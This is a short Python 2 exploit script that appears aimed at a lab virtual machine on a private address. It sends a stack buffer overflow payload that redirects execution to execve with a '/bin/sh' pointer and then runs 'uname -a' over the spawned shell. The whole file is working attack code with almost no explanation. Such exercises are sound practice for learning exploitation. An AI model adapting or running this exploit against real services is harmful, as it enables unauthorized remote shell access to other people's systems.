#!/usr/bin/python2

import socket
import struct

ip   = '192.168.56.102'
port = 2995

execve = '\x0c\x8c\x04\x08' # after `eee`
ret_aftc = 'AAAA'
binsh = '\xbf\x63\xfb\xb7' # 

overflow = 'a' * 510 + "\x00" + 'aaaabbbbccccddddeeef' + execve + ret_aftc + binsh + '\x00' * 8
exp = overflow

sock = socket.socket()
sock.connect((ip, port))
sock.send(exp + '\n')

sock.send("uname -a\n")
print sock.recv(1024)
